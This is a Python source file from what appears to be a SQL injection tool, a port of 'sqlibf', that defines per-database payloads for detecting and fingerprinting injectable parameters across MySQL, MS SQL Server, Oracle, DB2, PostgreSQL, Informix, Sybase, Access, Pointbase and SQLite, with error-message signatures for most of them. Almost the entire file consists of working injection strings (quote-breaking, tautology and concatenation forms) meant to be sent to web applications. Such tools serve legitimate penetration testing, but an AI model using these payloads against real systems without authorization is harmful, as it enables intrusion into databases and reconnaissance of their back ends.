#Covered by GPL V2.0
#Coded by Carlos del Ojo Elias (deepbit@gmail.com)
# This is a port of sqlibf to python, # sqlibf is a SQL injection 
# tool that was coded by Ramon Pinuaga (www.open-labs.org)


from injection import *
import urllib
import re

class database:
	def __init__(self,name="Unknown"):
		self.name=name
		self.tests={}
		self.confirms={}
		self.errors=[]

	def __str__ (self):
		return self.name

	def getName(self):
		return self.name

	def AddTest(self,type,pattern):
		self.tests[type]=urllib.quote(pattern)
		
	def AddConfirm(self,type,pattern):
		self.confirms[type]=urllib.quote(pattern)

	def getConfirmPattern(self,x):
		return self.confirms[x]
	
	def getTestPattern(self,x):
		return self.tests[x]

	def AddErrorSignature(self,str):
		self.errors.append(re.compile(str))

	def searchError(self,response):
		txt=response.getContent().replace("\n"," ")
		for i in self.errors:
			if i.findall(txt):
				return True
		return False

MysqlDB=database("MySQL")
MysqlDB.AddTest(TUnescaped,			" and CONNECTION_ID()=CONNECTION_ID() and 21=21")
MysqlDB.AddTest(TSingleQuote,		"' and CONNECTION_ID()=CONNECTION_ID() and '21'='21")
MysqlDB.AddTest(TDoubleQuote,		"\" and CONNECTION_ID()=CONNECTION_ID() and \"21\"=\"21")
MysqlDB.AddTest(TNumeric, 			"-(CONNECTION_ID()-CONNECTION_ID())")
MysqlDB.AddTest(TConcatPlus, 		"'+char(CONNECTION_ID()-CONNECTION_ID())+'")

MysqlDB.AddConfirm(TUnescaped,		" and USER()=USER() and 21=21")
MysqlDB.AddConfirm(TSingleQuote,	"' and USER()=USER() and '21'='21")
MysqlDB.AddConfirm(TDoubleQuote,	"\" and USER()=USER() and \"21\"=\"21")
MysqlDB.AddConfirm(TNumeric, 		"-(USER()-USER())")
MysqlDB.AddConfirm(TConcatPlus,		"'+char(USER()-USER())+'")

MysqlDB.AddErrorSignature("MySQL result")
MysqlDB.AddErrorSignature("SQL syntax.{1,80}MySQL")


#########

MSSQLDB=database("MS Sql Server")
MSSQLDB.AddTest(TUnescaped,			" and len(1)=1 and 21=21")
MSSQLDB.AddTest(TSingleQuote,		"' and len(1)=1 and '21'='21")
MSSQLDB.AddTest(TDoubleQuote,		"\" and len(1)=1 and \"21\"=\"21")
MSSQLDB.AddTest(TNumeric, 			"-(len(1)-1)")
MSSQLDB.AddTest(TConcatPlus,		"'+substring('1',1,(len(1)-1))+'")

MSSQLDB.AddConfirm(TUnescaped,		" and len(@@version)=len(@@version) and 21=21")
MSSQLDB.AddConfirm(TSingleQuote,	"' and len(@@version)=len(@@version) and '21'='21")
MSSQLDB.AddConfirm(TDoubleQuote,	"\" and len(@@version)=len(@@version) and \"21\"=\"21")
MSSQLDB.AddConfirm(TNumeric, 		"-(len(@@version)-len(@@version))")
MSSQLDB.AddConfirm(TConcatPlus,		"'+substring('1',1,(len(@@version)-len(@@version)))+'")

MSSQLDB.AddErrorSignature("Driver.{1,80}SQL Server")
MSSQLDB.AddErrorSignature( "Driver.{1,80}SQLServer")
MSSQLDB.AddErrorSignature("Sql Server.{1,80}Driver")
MSSQLDB.AddErrorSignature("OLE DB.{1,80}SQL Server")
#########

OracleDB=database("Oracle")
OracleDB.AddTest(TUnescaped,		" and ROWNUM=ROWNUM and 21=21")
OracleDB.AddTest(TSingleQuote,		"' and ROWNUM=ROWNUM and '21'='21")
OracleDB.AddTest(TDoubleQuote,		"\" and ROWNUM=ROWNUM and \"21\"=\"21")
OracleDB.AddTest(TNumeric,  		"-(ROWNUM-ROWNUM)")
OracleDB.AddTest(TConcatPipe, 		"'||substr(1,1,(ROWNUM-ROWNUM))||'")

OracleDB.AddConfirm(TUnescaped, 	" and length(SYSDATE)=length(SYSDATE) and 21=21")
OracleDB.AddConfirm(TSingleQuote, 	"' and length(SYSDATE)=length(SYSDATE) and '21'='21")
OracleDB.AddConfirm(TDoubleQuote, 	"\" and length(SYSDATE)=length(SYSDATE) and \"21\"=\"21")
OracleDB.AddConfirm(TNumeric,		"-(length(SYSDATE)-length(SYSDATE))")
OracleDB.AddConfirm(TConcatPipe, 	"'||substr(1,1,(length(SYSDATE)-length(SYSDATE)))||'")

OracleDB.AddErrorSignature("ORA-0")
OracleDB.AddErrorSignature("Oracle.{1,80}Driver")
OracleDB.AddErrorSignature("Oracle error")
OracleDB.AddErrorSignature("SQL.{1,80}ORA")
#######

DB2DB=database("DB2")
DB2DB.AddTest(TUnescaped, 			" and value(1,1)=1 and 21=21")
DB2DB.AddTest(TSingleQuote, 		"' and value(1,1)=1 and '21'='21")
DB2DB.AddTest(TDoubleQuote, 		"\" and value(1,1)=1 and \"21\"=\"21")
DB2DB.AddTest(TNumeric,  			"-(value(1,1)-1)")
DB2DB.AddTest(TConcatPipe,			"'||substr('1',1,(value(1,1)-1))||'")

DB2DB.AddConfirm(TUnescaped,		" and length(CURRENT SERVER)=length(CURRENT SERVER) and 21=21")
DB2DB.AddConfirm(TSingleQuote,		"' and length(CURRENT SERVER)=length(CURRENT SERVER) and '21'='21")
DB2DB.AddConfirm(TDoubleQuote,		"\" and length(CURRENT SERVER)=length(CURRENT SERVER) and \"21\"=\"21")
DB2DB.AddConfirm(TNumeric, 			"-(length(CURRENT SERVER)-length(CURRENT SERVER))")
DB2DB.AddConfirm(TConcatPipe, 		"'||substr('1',1,(length(CURRENT SERVER)-length(CURRENT SERVER)))||'")

DB2DB.AddErrorSignature("CLI Driver.{1,80}DB2")
DB2DB.AddErrorSignature("DB2 SQL error")

#######

PostgreSQLDB=database("PostgreSQL")
PostgreSQLDB.AddTest(TUnescaped, 		" and length(1)=1 and 21=21") 		
PostgreSQLDB.AddTest(TSingleQuote, 		"' and length(1)=1 and '21'='21") 		
PostgreSQLDB.AddTest(TDoubleQuote, 		"\" and length(1)=1 and \"21\"=\"21") 		
PostgreSQLDB.AddTest(TNumeric,  		"-(length(1)-1)")
PostgreSQLDB.AddTest(TConcatPipe,		"'||substr(1,1,(length(1)-1))||'")

PostgreSQLDB.AddConfirm(TUnescaped,		" and length(SESSION_USER)=length(SESSION_USER) and 21=21")
PostgreSQLDB.AddConfirm(TSingleQuote,	"' and length(SESSION_USER)=length(SESSION_USER) and '21'='21")
PostgreSQLDB.AddConfirm(TDoubleQuote,	"\" and length(SESSION_USER)=length(SESSION_USER) and \"21\"=\"21")
PostgreSQLDB.AddConfirm(TNumeric, 		"-(length(SESSION_USER)-length(SESSION_USER))")
PostgreSQLDB.AddConfirm(TConcatPipe, 	"'||substr(1,1,(length(SESSION_USER)-length(SESSION_USER)))||'")

PostgreSQLDB.AddErrorSignature("ERROR.{1,80}parser")
PostgreSQLDB.AddErrorSignature("PostgreSQL.{1,80}ERROR")

#######

InformixDB=database("Informix")
InformixDB.AddTest(TUnescaped, 			" and length(DBSERVERNAME)=length(DBSERVERNAME) and 21=21")
InformixDB.AddTest(TSingleQuote, 		"' and length(DBSERVERNAME)=length(DBSERVERNAME) and '21'='21")
InformixDB.AddTest(TDoubleQuote, 		"\" and length(DBSERVERNAME)=length(DBSERVERNAME) and \"21\"=\"21")
InformixDB.AddTest(TNumeric,  			"-(length(DBSERVERNAME)-length(DBSERVERNAME))")
InformixDB.AddTest(TConcatPipe,			"'||substr(1,1,(length(DBSERVERNAME)-length(DBSERVERNAME)))||'")

InformixDB.AddConfirm(TUnescaped,		" and length(SITENAME)=length(SITENAME) and 21=21")
InformixDB.AddConfirm(TSingleQuote,		"' and length(SITENAME)=length(SITENAME) and '21'='21")
InformixDB.AddConfirm(TDoubleQuote,		"\" and length(SITENAME)=length(SITENAME) and \"21\"=\"21")
InformixDB.AddConfirm(TNumeric, 		"-(length(SITENAME)-length(SITENAME))")
InformixDB.AddConfirm(TConcatPipe, 		"'||substr(1,1,(length(SITENAME)-length(SITENAME)))||'")

InformixDB.AddErrorSignature("Exception.{1,80}Informix")

#######

SybaseDB=database("Sybase")
SybaseDB.AddTest(TUnescaped, 	 		" and char_length(db_name())=char_length(db_name()) and 21=21")
SybaseDB.AddTest(TSingleQuote, 	 		"' and char_length(db_name())=char_length(db_name()) and '21'='21")
SybaseDB.AddTest(TDoubleQuote, 	 		"\" and char_length(db_name())=char_length(db_name()) and \"21\"=\"21")
SybaseDB.AddTest(TNumeric,  	 		"-(char_length(db_name())-char_length(db_name()))")
SybaseDB.AddTest(TConcatPlus,		 	"'+char(char_length(db_name())-char_length(db_name()))+'")

SybaseDB.AddConfirm(TUnescaped,			" and char_length(@@servername)=char_length(@@servername) and 21=21")
SybaseDB.AddConfirm(TSingleQuote,		"' and char_length(@@servername)=char_length(@@servername) and '21'='21")
SybaseDB.AddConfirm(TDoubleQuote,		"\" and char_length(@@servername)=char_length(@@servername) and \"21\"=\"21")
SybaseDB.AddConfirm(TNumeric, 			"-(char_length(@@servername)-char_length(@@servername))")
SybaseDB.AddConfirm(TConcatPlus, 		"'+char(char_length(@@servername)-char_length(@@servername))+'")

SybaseDB.AddErrorSignature("Sybase message")
#######

MSAccessDB=database("MSAccess")
MSAccessDB.AddTest(TUnescaped, 			" and Time()=Time() and 21=21")
MSAccessDB.AddTest(TSingleQuote, 		"' and Time()=Time() and '21'='21")
MSAccessDB.AddTest(TDoubleQuote, 		"\" and Time()=Time() and \"21\"=\"21")
MSAccessDB.AddTest(TNumeric,  			"-(Time()-Time())")
MSAccessDB.AddTest(TConcatPlus,			"'+chr(Time()-Time())+'")

MSAccessDB.AddConfirm(TUnescaped,		" and IsNumeric(1)=IsNumeric(1) and 21=21")
MSAccessDB.AddConfirm(TSingleQuote,		"' and IsNumeric(1)=IsNumeric(1) and '21'='21")
MSAccessDB.AddConfirm(TDoubleQuote,		"\" and IsNumeric(1)=IsNumeric(1) and \"21\"=\"21")
MSAccessDB.AddConfirm(TNumeric, 		"-(IsNumeric(1)-IsNumeric(1))")
MSAccessDB.AddConfirm(TConcatPlus, 		"'+chr(IsNumeric(1)-IsNumeric(1))+'")

MSAccessDB.AddErrorSignature( "Driver.{1,80}Access")
MSAccessDB.AddErrorSignature("Access.{1,80}Driver")
MSAccessDB.AddErrorSignature("ODBC.{1,80}Microsoft Access")
#######

PointbaseDB=database("Pointbase")
PointbaseDB.AddTest(TUnescaped, 		" and CURRENT_USER=CURRENT_USER and 21=21")
PointbaseDB.AddTest(TSingleQuote, 		"' and CURRENT_USER=CURRENT_USER and '21'='21")
PointbaseDB.AddTest(TDoubleQuote, 		"\" and CURRENT_USER=CURRENT_USER and \"21\"=\"21")
PointbaseDB.AddTest(TNumeric,  			"-(CURRENT_USER-CURRENT_USER)")
PointbaseDB.AddTest(TConcatPipe,		"'||substr(1,1,(CURRENT_USER-CURRENT_USER))||'")

PointbaseDB.AddConfirm(TUnescaped,		" and CURRENT_SESSION=CURRENT_SESSION and 21=21")
PointbaseDB.AddConfirm(TSingleQuote,	"' and CURRENT_SESSION=CURRENT_SESSION and '21'='21")
PointbaseDB.AddConfirm(TDoubleQuote,	"\" and CURRENT_SESSION=CURRENT_SESSION and \"21\"=\"21")
PointbaseDB.AddConfirm(TNumeric, 		"-(CURRENT_SESSION-CURRENT_SESSION)")
PointbaseDB.AddConfirm(TConcatPipe,		"'||substr(1,1,(CURRENT_SESSION-CURRENT_SESSION))||'")

#######

SQLiteDB=database("SQLite")
SQLiteDB.AddTest(TUnescaped, 		" and sqlite_version()=sqlite_version() and 21=21")
SQLiteDB.AddTest(TSingleQuote, 		"' and sqlite_version()=sqlite_version() and '21'='21")
SQLiteDB.AddTest(TDoubleQuote, 		"\" and sqlite_version()=sqlite_version() and \"21\"=\"21")
SQLiteDB.AddTest(TNumeric,  		"-(sqlite_version()-sqlite_version())")
SQLiteDB.AddTest(TConcatPipe,		"'||substr(1,1,(sqlite_version()-sqlite_version()))||'")

SQLiteDB.AddConfirm(TUnescaped,		" and last_insert_rowid()=last_insert_rowid() and 21=21")
SQLiteDB.AddConfirm(TSingleQuote,	"' and last_insert_rowid()=last_insert_rowid() and '21'='21")
SQLiteDB.AddConfirm(TDoubleQuote,	"\" and last_insert_rowid()=last_insert_rowid() and \"21\"=\"21")
SQLiteDB.AddConfirm(TNumeric, 		"-(last_insert_rowid()-last_insert_rowid())")
SQLiteDB.AddConfirm(TConcatPipe, 	"'||substr(1,1,(last_insert_rowid()-last_insert_rowid()))||'")


